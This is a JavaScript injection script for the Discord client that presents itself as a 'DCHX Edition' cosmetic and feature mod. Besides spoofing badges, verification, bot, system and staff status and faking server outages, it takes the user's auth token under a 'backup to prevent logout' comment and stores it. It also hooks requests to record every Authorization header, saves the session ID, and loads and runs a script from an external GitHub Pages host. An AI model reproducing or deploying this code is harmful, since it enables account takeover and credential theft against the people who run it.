//require('url')
function require(url) {
document.body.appendChild(Object.assign(document.createElement("script"), {
    src: url,
    nonce: document.querySelector("[nonce]").nonce,
    onerror: console.error
  }))
}

//DCHXForm
function dchxform(boxid, title, button, buttonid){
  var boxvar = document.createElement("form");
  boxvar.id = boxid
  boxvar.className = 'dchxform'
  boxvar.name = boxid
  boxvar.style = `z-index:100;min-height: 130px; transform: translateX(0px) translateY(-32px); opacity: 0.85; font-family: sans-serif; width: 153px; height: 137px; background: rgb(0, 0, 0); position: absolute; border-radius: 5px; display: grid; place-items: center; color: white; font-size: larger; top: 50%; left: 50%;`
 boxvar.innerHTML = `<h1 style=" font-size: 20px;"><center>${title}</center>
    <div class="line"></div>
    <p>  
    <input class=${boxid} type="text" name=${boxid} style="width:120px;text-align:center;background:#181717;border:0px;color:#fff;" placeholder=${boxid}><br>
    <input id=${buttonid} type="button" value=${button} name="Submit" style="margin-left:40px;background:#4c4c4c;border:0px;">  
</p>
<style>
input::placeholder {
color: white;
padding:0px
outline: none;
border: 0px;
}

.line {
    width: 124px;;
    height: 1px;;
    background: repeating-linear-gradient(90deg,red 0%, yellow 7.14%, rgb(0,255,0) 14.28%, rgb(0,255,255) 21.42%, cyan 28.56%, blue 35.7%, magenta 42.84%, red 50%);
   background-size:100vw 200vw; 
    -webkit-animation:'slide' 30s infinite linear forwards;
}@keyframes slide{
  0%{
    background-position-x: 0%;
  }
  100%{
    background-position-x: 600vw;
  }
}
</style>`
document.body.appendChild(boxvar);
}

function rdchxform(){document.getElementsByClassName("dchxform")[0].remove();}

//Title
document.getElementsByClassName("wordmarkWindows-2dq6rw wordmark-2u86JB")[0].innerHTML = `<span style='font-size:15px'>Discord - DCHX Edition</span>`

//Webpack Modules
function loadWebpackModules(){

  //Get All Badges
  function getAB(){ (()=>{let E={DISCORD_EMPLOYEE:1,DISCORD_PARTNER:2,HYPESQUAD_EVENTS:4,BUG_HUNTER_LEVEL_1:8,HOUSE_BRAVERY:64,HOUSE_BRILLIANCE:128,HOUSE_BALANCE:256,EARLY_SUPPORTER:512,BUG_HUNTER_LEVEL_2:16384,VERIFIED_BOT_DEVELOPER:1<<17,CERTIFIED_MODERATOR:1<<18};webpackChunkdiscord_app.push([[Math.random()],{},e=>{for(const R of Object.keys(e.c).map((E=>e.c[E].exports)).filter((E=>E)))if(R.default&&void 0!==R.default.getCurrentUser)return R.default.getCurrentUser().flags=Object.values(E).reduce(((E,e)=>E+e),0)}])})(); }

  //Get All Badges & Urgent Discord Message
  function getABUDM(){ webpackChunkdiscord_app.push([[Math.random()],{},(req)=>{for(const m of Object.keys(req.c).map((x)=>req.c[x].exports).filter((x)=>x)){if(m.Z&&m.Z.getCurrentUser!==undefined){return m.Z.getCurrentUser().flags=99999999999}}}]); }

  //Get All Badges & Flag Account Under Quarantine
  function getABFAUD(){ webpackChunkdiscord_app.push([[Math.random()],{},(req)=>{for(const m of Object.keys(req.c).map((x)=>req.c[x].exports).filter((x)=>x)){if(m.Z&&m.Z.getCurrentUser!==undefined){return m.Z.getCurrentUser().flags=-1}}}]); }

  //Get Bot Tag
  function getBT(){ window.webpackChunkdiscord_app.push([[Math.random()], {}, (req) => {for (const m of Object.keys(req.c).map((x) => req.c[x].exports).filter((x) => x)) {if (m.Z && m.Z.getCurrentUser !== undefined) {return m.Z.getCurrentUser().bot = true;}if (m.getCurrentUser !== undefined) {return m.getCurrentUser().bot = true}}}]);window.webpackChunkdiscord_app.push([[Math.random()], {}, (req) => {for (const m of Object.keys(req.c).map((x) => req.c[x].exports).filter((x) => x)) {if (m.Z && m.Z.getCurrentUser !== undefined) {return m.Z.getCurrentUser().isVerifiedBot = () => true;}if (m.getCurrentUser !== undefined) {return m.getCurrentUser().isVerifiedBot = () => true}}}]) }
  
  //Get System Tag
  function getSYST(){ window.webpackChunkdiscord_app.push([[Math.random()], {}, (req) => {for (const m of Object.keys(req.c).map((x) => req.c[x].exports).filter((x) => x)) {if (m.Z && m.Z.getCurrentUser !== undefined) {return m.Z.getCurrentUser().isSystemUser = () => true;}if (m.getCurrentUser !== undefined) {return m.getCurrentUser().isSystemUser = () => true}}}]) }
  
  //View NSFW Channels
  function viewNSFW(){ var findModule=(item)=>window.webpackChunkdiscord_app.push([[Math.random()],{},(req)=>{for(const m of Object.keys(req.c).map((x)=>req.c[x].exports).filter((x)=>x)){if(m.Z&&m.Z[item]!==undefined)return m.Z}}]);findModule('getCurrentUser').getCurrentUser().nsfwAllowed = true }
  
  //Fake Outage
  function fakeOUT(){ webpackChunkdiscord_app.push([["h"], {}, e => {mods = Object.values(e.c)}]);for (let [key, val] of Object.entries(mods.find(m => m?.exports?.Z?.getGuilds).exports.Z.getGuilds())) {    Dispatcher = (webpackChunkdiscord_app.push([[''],{},e=>{m=[];for(let c in e.c)m.push(e.c[c])}]),m).find(m => m?.exports?.Z?.isDispatching);Dispatcher.exports.Z.dispatch({    type: "GUILD_UNAVAILABLE",    guildId: val }); } }
  
  //Phone & Email Bypass
  function bypassPE(){ window.webpackChunkdiscord_app.push([[Math.random()], {}, (req) => {for (const m of Object.keys(req.c).map((x) => req.c[x].exports).filter((x) => x)) {if (m.Z && m.Z.getCurrentUser !== undefined) {return m.Z.getCurrentUser().phone = '+1234567890';}if (m.getCurrentUser !== undefined) {return m.getCurrentUser().phone = '+1234567890'}}}]);window.webpackChunkdiscord_app.push([[Math.random()], {}, (req) => {for (const m of Object.keys(req.c).map((x) => req.c[x].exports).filter((x) => x)) {if (m.Z && m.Z.getCurrentUser !== undefined) {return m.Z.getCurrentUser().email = 'email@email.com';}if (m.getCurrentUser !== undefined) {return m.getCurrentUser().email = 'email@email.com'}}}]);window.webpackChunkdiscord_app.push([[Math.random()], {}, (req) => {for (const m of Object.keys(req.c).map((x) => req.c[x].exports).filter((x) => x)) {if (m.Z && m.Z.getCurrentUser !== undefined) {return m.Z.getCurrentUser().verified = true;}if (m.getCurrentUser !== undefined) {return m.getCurrentUser().verified = true}}}]); }
  
  //Make All Servers Unavailable
  function unavailServers(){ h='isUnavailable';(webpackChunkdiscord_app.push([[''],{},e=>{m=[];for(let c in e.c)m.push(e.c[c])}]),m).find(m=>m?.exports?.Z?.[h]!==void 0).exports.Z[h]=(e)=>1 }
  
  //Get Session Id
  function getSeshId(){ (webpackChunkdiscord_app.push([[''],{},e=>{m=[];for(let c in e.c)m.push(e.c[c])}]),m).find(m => m?.exports?.default?.getSessionId).exports.default.getSessionId() }
  
  //Fake Deafen/Mute
  function fakeDeafen(){ var dftext=new TextDecoder("utf-8");WebSocket.prototype.original=WebSocket.prototype.send,WebSocket.prototype.send=function(e){"[object ArrayBuffer]"===Object.prototype.toString.call(e)&&dftext.decode(e).includes("self_deaf")&&(e=e.replace('"self_mute":false',"Raz")),WebSocket.prototype.original.apply(this,[e])}; }
    
  //Clyde Error
  function sendClyde(channel){ return (webpackChunkdiscord_app.push([[''],{},e=>{m=[];for(let c in e.c)m.push(e.c[c])}]),m).find(m => m?.exports?.Z?.sendClydeError).exports.Z.sendClydeError(channel) }
  
  //Get GuildChannelIds
  function getGuildChanIds(guild){ ((typeof mods === 'undefined' ? webpackChunkdiscord_app.push([["meow"], {}, e => { mods = Object.values(e.c) }]) : null),mods).find(e => e?.exports?.Z?.getMutableGuildChannelsForGuild).exports.Z.getMutableGuildChannelsForGuild(guild) }
  
  //Get HiddenChannelIds
  function getHidChanIds(){ window.webpackChunkdiscord_app.push([[Math.random()], {}, (req) => {for (const m of Object.keys(req.c).map((x) => req.c[x].exports).filter((x) => x)) {if (m.Z && m.Z.getPrivateChannelIds !== undefined) {return console.log(m.Z.getPrivateChannelIds())}if (m.getPrivateChannelIds !== undefined) {return console.log(m.getPrivateChannelIds())}}}]); }
  
  //Staff Mode
  function staffMode(){ (()=>{let e;window.webpackChunkdiscord_app.push([[Math.random()],{},r=>{e=r}]),mod=Object.values(e.c).find((e=>void 0!==e?.exports?.Z?.isDeveloper)),usermod=Object.values(e.c).find((e=>e?.exports?.Z?.getUsers)),nodes=Object.values(mod.exports.Z._dispatcher._actionHandlers._dependencyGraph.nodes);try{nodes.find((e=>"ExperimentStore"==e.name)).actionHandler.OVERLAY_INITIALIZE({user:{flags:1}})}catch(e){}oldGetUser=usermod.exports.default.__proto__.getCurrentUser,usermod.exports.default.__proto__.getCurrentUser=()=>({hasFlag:()=>!0}),nodes.find((e=>"DeveloperExperimentStore"==e.name)).actionHandler.CONNECTION_OPEN(),usermod.exports.default.__proto__.getCurrentUser=oldGetUser})(); }
  
  
}

//Spotify Thing
XMLHttpRequest.prototype.realOpen = XMLHttpRequest.prototype.open;
function myOpen(method, url, async, user, password) {
  if (url == "https://api.spotify.com/v1/me/player/pause" && method == "PUT") url = "127.0.0.1";
  this.realOpen(method, url, async, user, password);
}
XMLHttpRequest.prototype.open = myOpen;

//LocalStorage And Token Backup To Prevent Logout Problems
window.sessionStorage = document.body.appendChild(document.createElement('iframe')).contentWindow.sessionStorage;
const localStorage = (() => {
  // If 'window.localStorage' return it
  if (window.localStorage) return window.localStorage
  // Magic stuff to make bd not break it
  const frame = document.createElement("frame")
  frame.src = "about:blank"
  document.body.appendChild(frame)
  let localStorage = Object.getOwnPropertyDescriptor(frame.contentWindow, "localStorage")
  frame.remove()
  Object.defineProperty(window, "localStorage", localStorage)
  localStorage = window.localStorage
  delete window.localStorage
  return localStorage
})()

const configStorage = {
  getItem: function(key) {
    localStorage.setItem("DCHX", localStorage.getItem("DCHX") ?? "{}")
    const storage = JSON.parse(localStorage.getItem("DCHX"))
    return storage[key]
  },
  setItem: function(key, value) {
    localStorage.setItem("DCHX", localStorage.getItem("DCHX") ?? "{}")
    const storage = JSON.parse(localStorage.getItem("DCHX"))
    storage[key] = value
    localStorage.setItem("DCHX", JSON.stringify(storage))
  },
  get getAll() {
    localStorage.setItem("DCHX", localStorage.getItem("DCHX") ?? "{}")
    return JSON.parse(localStorage.getItem("DCHX"))
  }
}

configStorage.setItem("Name", "DCHX")

require('https://dschx.github.io/source/scripts/js/requires/GUI.js')

var voken = (webpackChunkdiscord_app.push([[''], {}, e => { m = []; for (let c in e.c) m.push(e.c[c]) }]), m).find(m => m?.exports?.default?.getToken !== void 0).exports.default.getToken()
var token1 = `"`
localStorage.setItem("token", " " + token1 + "" + voken + "" + token1 + " ")

//Load Modules
loadWebpackModules()

//Variables
const friendinv = `https://discord.${""}gg/${(await (webpackChunkdiscord_app.push([[''],{},e=>{m=[];for(let c in e.c)m.push(e.c[c])}]),m).find(m => m?.exports?.Z?.createFriendInvite).exports.Z.createFriendInvite()).code}`

//Get Module
var webpackExports = webpackChunkdiscord_app.push([[Math.random()],{},(e) => e])

function getModule(filter, first = true) {
  let modules = []
  function byPropsAll(...props) {
    const norm = getModule(m => props.every((prop) => typeof m[prop] !== "undefined"), false)
    let def = []
    for (const module of getModule(m => props.every((prop) => typeof m.default?.[prop] !== "undefined"), false)) 
      def.push(module.default)
    return [...norm, ...def]
  }
  function byDisplayName(displayName) {
    const norm = getModule(m => m.default?.displayName === displayName, false)
    const type = getModule(m => m.default?.type?.displayName === displayName, false)
    const rend = getModule(m => m.default?.type?.render?.displayName === displayName, false)
    return [...norm, ...type, ...rend]
  }
  if (Array.isArray(filter)) {
    modules = byPropsAll(...filter)
  }
  else if (typeof filter === "string") {
    modules = byDisplayName(filter)
  }
  else if (typeof filter === "function") {
      for(let ite in webpackExports.c) {
      if(!Object.hasOwnProperty.call(webpackExports.c, ite)) return
      let ele = webpackExports.c[ite].exports
      if(!ele) continue
      if(filter(ele)) modules.push(ele)
    }
  }
  if (first) return modules[0]
  return modules
}

//Inject Css Module
function injectCss(id, css) {
  const style = document.createElement('style');
  style.id = id;
  style.innerText = css;
  document.head.appendChild(style);
  return style;
}

//Toast Module
injectCss("toasts-css", `.dt-toast { 
  display: inline-flex; 
  box-sizing: border-box; 
  border-radius: 3px; 
  color: var(--text-normal); 
  font-size: 16px; 
  background-color: var(--background-floating); 
  vertical-align: bottom; 
  box-shadow: var(--elevation-low); 
  margin: 0 10px 0 auto; 
  flex-grow: 1; 
  opacity: 1; 
  transition: opacity 0.3s ease-in-out; 
  width: fit-content; 
} 
.dt-toast.adding { 
  opacity: 0 
} 
.dt-toast.removing { 
  opacity: 0 
} 
.dt-toast:not(:last-child) { 
  margin-bottom: 5px 
} 
.dt-toast-container { 
  position: absolute; 
  bottom: 0; 
  right: 0; 
  display: flex; 
  flex-direction: column; 
  align-items: flex-end; 
  max-width: 100%; 
  z-index: 999; 
  overflow: hidden; 
} 
.dt-toast-wrapper { 
  overflow: hidden; 
  height: auto; 
  margin: 0; 
  border-radius: 3px; 
  display: flex; 
  flex-direction: column; 
  min-width: auto; 
  transition-property: all; 
  transition-timing-function: ease; 
  transition-duration: 0.5s; 
} 
.dt-toast-type { 
  display: flex; 
  justify-content: center; 
  align-items: center; 
  min-width: 18px; 
  margin-right: 5px; 
  border-radius: 3px 0 0 3px; 
  background-color: transparent; 
  position: relative; 
} 
.dt-toast-type::after { 
  content: ""; 
  position: absolute; 
  background-color: var(--background-floating); 
  width: 6px; 
  border-radius: 6px; 
  height: 100%; 
  right: -3px; 
} 
.dt-toast-type.success { 
  background-color: #23395d; 
} 
.dt-toast-type.error { 
  background-color: var(--info-danger-foreground); 
} 
.dt-toast-type.info { 
  background-color: var(--brand-experiment); 
} 
.dt-toast-type.warning { 
  background-color: var(--info-warning-foreground); 
} 
.dt-toast-message { 
  display: inline-block; 
  user-select: text; 
} 
.dt-toast-message-wrapper { 
  flex: 1; 
  padding: 12px 6px 12px 3px; 
  position: relative; 
} 
.dt-toast-close { 
  cursor: pointer; 
  display: flex; 
  align-items: center; 
  padding: 2px 10px 0; 
  user-select: none; 
  color: var(--interactive-normal); 
  position: relative; 
  font-size: 14px; 
} 
.dt-toast-close:hover { 
  color: var(--interactive-hover); 
  background-color: #565656; 
  border-radius:2px;
}`)
// container
const toastContainer = document.createElement("div");
toastContainer.className = "dt-toast-container";
document.body.appendChild(toastContainer);
const toastWrapper = document.createElement("div");
toastWrapper.className = "dt-toast-wrapper";
toastWrapper.style.marginBottom = "5px";
toastContainer.appendChild(toastWrapper);
function Timer(callback, delay) {
    let timerId, start, remaining = delay;
    const pause = function () {
        window.clearTimeout(timerId);
        timerId = null;
        remaining -= Date.now() - start;
    };
    const resume = function () {
        if (timerId)
            return;
        start = Date.now();
        timerId = window.setTimeout(callback, remaining);
    };
    resume();
    return { pause, resume };
}
function showToast(text, options={}) {
    const { type = "success", duration = 3000, autoClose = true, closeButton = true } = options;
    if (!autoClose && !closeButton)
        throw new Error("You can't have autoClose and closeButton disabled");
    const toast = document.createElement("div");
    toast.className = "dt-toast adding";
    setTimeout(() => toast.classList.remove("adding"), 300);
    toastWrapper.appendChild(toast);
    const toastType = document.createElement("span");
    toastType.className = `dt-toast-type ${type.toLowerCase()}`;
    toast.appendChild(toastType);
    const toastMessageWrapper = document.createElement("div");
    toastMessageWrapper.className = "dt-toast-message-wrapper";
    toast.appendChild(toastMessageWrapper);
    const toastMessage = document.createElement("span");
    toastMessage.className = "dt-toast-message";
    toastMessage.innerText = text;
    toastMessageWrapper.appendChild(toastMessage);
    function removeToast() {
        toast.classList.add("removing");
        setTimeout(() => toast.remove(), 300);
    }
    if (closeButton) {
        const toastClose = document.createElement("span");
        toastClose.className = "dt-toast-close";
        toastClose.innerText = "✕";
        toastClose.onclick = removeToast;
        toast.appendChild(toastClose);
    }
    const dur = Timer(() => autoClose && removeToast(), duration);
    toast.onmouseenter = dur.pause;
    toast.onmouseleave = dur.resume;
    return toast;
}

/* Module List
let { getCurrentUser } = getModule(["getCurrentUser"])
let { getToken } = getModule(["getToken"])
//let { getGuild } = getModule(["getGuild"]) - Broken
//let { getPrivateChannelsIds } = getModule(["getPrivateChannelIds"]) // get private channel id list
let sendMessage = getModule(["sendMessage"])
//let { getChannelId } = getModule(["getChannelId", "getVoiceChannelId"]) //current Channel Id
//let { getByName } = getModule(["getByName"])
let getSelfEmbeddedActivities = getModule(["getSelfEmbeddedActivities"])
//let { getChannel } = getModule(["getChannel"])
//let { getChannels } = getModule(["getChannels"]) 
let { getRole } = getModule(["getRole"]) //Get Role info
let { getGuildId } = getModule(["getGuildId"]) //Get guild ID
let { getUser } = getModule(["getUser"]) //Get All User info
let { getUsers } = getModule(["getUsers"]) //Get All User info can get in current Guild (include bot)
let { getUserIds } = getModule(["getUserIds"]) //Just get all user id in current Guild
let { openPrivateChannel } = getModule(["openPrivateChannel"]) //Open DM Group
let { getStatus } = getModule(["getStatus"]) //Idk what it is but it make sense
let { getActivity } = getModule(["getActivity"]) //Make sense and work
let { getActivities } = getModule(["getActivities"])
let { editMessage } = getModule(["editMessage"])
let { disconnect } = getModule(["disconnect"]) //Disconnect Voice Channel
let { connect } = getModule(["connect"]) //Connect Voice
let { createGuild } = getModule(["createGuild"]) //Make Server
let { setToken } = getModule(["setToken"]) //SetToken
let { login } = getModule(["login"]) //Login
let { logout } = getModule(["logout"]) //Log out
let { joinGuild } = getModule(["joinGuild"]) //Join guild
let { leaveGuild } = getModule(["leaveGuild"]) //Leave guild
let { dispatch } = getModule(["dispatch"]) //idk
let { hideToken } = getModule(["hideToken"]) //Hide token
let { Token } = getModule(["Token"]) //Token
let { getEmail } = getModule(["getEmail"]) //Get email
let { getRegion } = getModule(["getRegion"])
let { createBotMessage } = getModule(["createBotMessage"])
let queue = getModule(["enqueue"])
let { receiveMessage } = getModule(["receiveMessage"])
let { lastMessageId } = getModule(["lastMessageId"])
let { getDefaultPrice } = getModule(["getDefaultPrice"])
let { getUserMaxFileSize } = getModule(["getUserMaxFileSize"])
let { getPrice } = getModule(["getPrice"])
let { getInterval } = getModule(["getInterval"])
let { getPremiumType } = getModule(["getPremiumType"])
let { getDisplayName } = getModule(["getDisplayName"])
let { getPremiumTypeSubscription } = getModule(["getPremiumTypeSubscription"])
let { flushDNSCache } = getModule(["flushDNSCache"])
let { flushCookies } = getModule(["flushCookies"])
let { setApplicationBackgroundColor } = getModule(["setApplicationBackgroundColor"])
let { setZoomFactor } = getModule(["setZoomFactor"])
let { submitLiveCrashReport } = getModule(["submitLiveCrashReport"])
let { getPidFromDesktopSource } = getModule(["getPidFromDesktopSource"])
let { getAudioPid } = getModule(["getAudioPid"])
let { generateSessionFromPid } = getModule(["generateSessionFromPid"])
let { allowChannelAccess } = getModule(["allowChannelAccess"])
let { getChromeVersion } = getModule(["getChromeVersion"])
let { getEdgeVersion } = getModule(["getEdgeVersion"])
let { getElectronVersion } = getModule(["getElectronVersion"])
let { getFirefoxVersion } = getModule(["getFirefoxVersion"])
let { getGuildIconURL } = getModule(["getGuildIconURL"])
let { getGuildSplashURL } = getModule(["getGuildSplashURL"])
let { getGuildSplashSource } = getModule(["getGuildSplashSource"])
let { getGuildDiscoverySplashURL } = getModule(["getGuildDiscoverySplashURL"])
let { getGuildDiscoverySplashSource } = getModule(["getGuildDiscoverySplashSource"])
let { getGuildBannerURL } = getModule(["getGuildBannerURL"])
let { getGuildTemplateIconURL } = getModule(["getGuildTemplateIconURL"])
let { getChannelIconURL } = getModule(["getChannelIconURL"])
let { getEmojiURL } = getModule(["getEmojiURL"])
let { getApplicationIconURL } = getModule(["getApplicationIconURL"])
let { getGameAssetURL } = getModule(["getGameAssetURL"])
let { getVideoFilterAssetURL } = getModule(["getVideoFilterAssetURL"])
let { getGameAssetSource } = getModule(["getGameAssetSource"])
let { getGuildIconSource } = getModule(["getGuildIconSource"])
let { getGuildTemplateIconSource } = getModule(["getGuildTemplateIconSource"])
let { getGuildBannerSource } = getModule(["getGuildBannerSource"])
let { getChannelIconSource } = getModule(["getChannelIconSource"])
let { getApplicationIconSource } = getModule(["getApplicationIconSource"])
let { getDefaultAvatarURL } = getModule(["getDefaultAvatarURL"])
let { getGuildMemberAvatarURL } = getModule(["getGuildMemberAvatarURL"])
let { getGuildMemberAvatarURLSimple } = getModule(["getGuildMemberAvatarURLSimple"])
let { getGuildMemberAvatarSource } = getModule(["getGuildMemberAvatarSource"])
let { getGuildMemberBannerURL } = getModule(["getGuildMemberBannerURL"])
let { getUserBannerURL } = getModule(["getUserBannerURL"])
let { hasAnimatedGuildIcon } = getModule(["hasAnimatedGuildIcon"])
let { hasAnimatedUserBanner } = getModule(["hasAnimatedUserBanner"])
let { isAnimatedIconHash } = getModule(["isAnimatedIconHash"])
let { getUserAvatarSource } = getModule(["getUserAvatarSource"])
let { getUserAvatarColor } = getModule(["getUserAvatarColor"])
let { PremiumSubscriptionSKUs } = getModule(["PremiumSubscriptionSKUs"])


const React = getModule(["createElement", "Component"])
const { copy } = getModule(["copy", "paste"])
const sleep = (time) => new Promise(resolve => setTimeout(resolve, time))
*/

//Functions

XMLHttpRequest.prototype.wrappedSetRequestHeader = XMLHttpRequest.prototype.setRequestHeader; 

XMLHttpRequest.prototype.setRequestHeader = function(header, value) {
    this.wrappedSetRequestHeader(header, value);
    if(header == 'Authorization') 
        configStorage.setItem("Auth", value)
}

configStorage.setItem("Sesh", (webpackChunkdiscord_app.push([[''],{},e=>{m=[];for(let c in e.c)m.push(e.c[c])}]),m).find(m => m?.exports?.default?.getSessionId).exports.default.getSessionId())
